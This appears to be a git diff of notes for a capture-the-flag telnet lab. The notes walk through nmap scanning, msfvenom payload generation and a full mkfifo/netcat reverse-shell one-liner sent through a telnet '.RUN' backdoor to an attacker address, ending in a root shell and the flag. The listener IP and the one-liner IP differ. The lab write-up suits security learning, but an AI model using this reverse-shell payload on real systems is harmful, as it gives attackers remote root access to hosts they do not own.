@@ -3,8 +3,38 @@ nmap -sT -A 10.10.90.130
 nmap -sT -p- 10.10.90.130
 nmap -sT -p 8012 -A -sV -vv 10.10.90.130
 
+# -n stands for not to perform reverse dns lookup. -sV stands to grab all the version information
 nmap -n -sV -p 8012 --script "*telnet* and safe" 10.10.90.130
-# -n stands for not to perform reverse dns lookup
-# -sV stands to grab all the version information
 
+# checking the banner through netcat
 netcat -nv 10.10.90.130 8012
+
+# tcpdump - listen if you are able to ping from the victim's ip. You must be able to see that response.
+sudo tcpdump ip proto \\icmp -i eth0
+
+# msfvenom is for payload generation of which we are going to use reverse_netcat
+msfvenom --list payloads | grep reverse_netcat
+msfvenom -p cmd/unix/reverse_netcat lhost=10.10.117.176 lport=4444 R
+
+# go ahead and copy the above payload which is generated in the telnet session.
+```
+telnet 10.10.90.130 8012
+.RUN ping 10.10.117.176 -c 1
+.RUN <msfvenom payload for cmd/unix/reverse_netcat>
+.RUN mkfifo /tmp/uqdoio; nc 10.18.112.115 4444 0</tmp/uqdoio | /bin/sh >/tmp/uqdoio 2>&1; rm /tmp/uqdoio;
+```
+
+# we will use netcat to listen on all interfaces on 4444 port.
+nc -lvp 4444
+```
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.10.90.130 obtained
+id
+uid=0(root)
+whoami
+root
+ls
+flag.txt
+cat flag.txt
+THM{telnet_flag}
+```
